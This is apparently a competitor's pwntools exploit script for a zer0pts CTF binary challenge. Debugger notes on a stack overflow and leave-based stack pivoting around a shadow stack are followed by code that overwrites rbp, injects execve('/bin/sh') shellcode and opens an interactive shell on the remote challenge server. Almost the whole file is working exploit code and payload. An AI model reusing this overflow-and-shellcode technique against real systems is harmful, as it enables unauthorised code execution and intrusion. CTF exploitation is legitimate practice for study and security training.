from pwn import *

'''
0x400207 = first write of Data

0x4001ec <read+2>               
		syscall  <SYS_read>
		fd: 0x0
        buf: 0x7fffffffe3c0 ◂— 0x0
        nbytes: 0x1000

0x00007fffffffe5c8 = rbp after leave
This can be overwritten
`leave` instruction works as `mov rsp, rbp; pop rbp;`.
So i can effectively change my stack


call instruction:
   0x4000ef <notvuln+4>     mov    ecx, dword ptr [__stack_depth] <0x60022e>
   0x4000f6 <notvuln+11>    mov    qword ptr [rcx*8 + 0x600234], .@4.return_address <0x40010b>
   0x400102 <notvuln+23>    inc    dword ptr [__stack_depth] <0x60022e>
   0x400109 <notvuln+30>    jmp    vuln <vuln>

0x600234 stack_shadow


'''

local_bin = "./chall"

#p = gdb.debug(local_bin, '''
	#break _start
	#break *main
	#break *vuln
	#break *read
    #''')

#pwn.ctf.zer0pts.com 9011    
#p = process("./chall")
p = remote("pwn.ctf.zer0pts.com",9011) 

output = p.recvuntil('Data:')
print(output)

overflow = 0x100
rbp_control = p64(0x600334, endian='little') 
payload = b"a" * overflow
payload += rbp_control 
p.clean()
p.send(payload)

output = p.recvuntil('Data:')
payload = b"a" * 8
payload += p64(0x600244, endian='little') 
shell_payload = b"\x90" * 0x1 + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += shell_payload
p.send(payload)

p.interactive()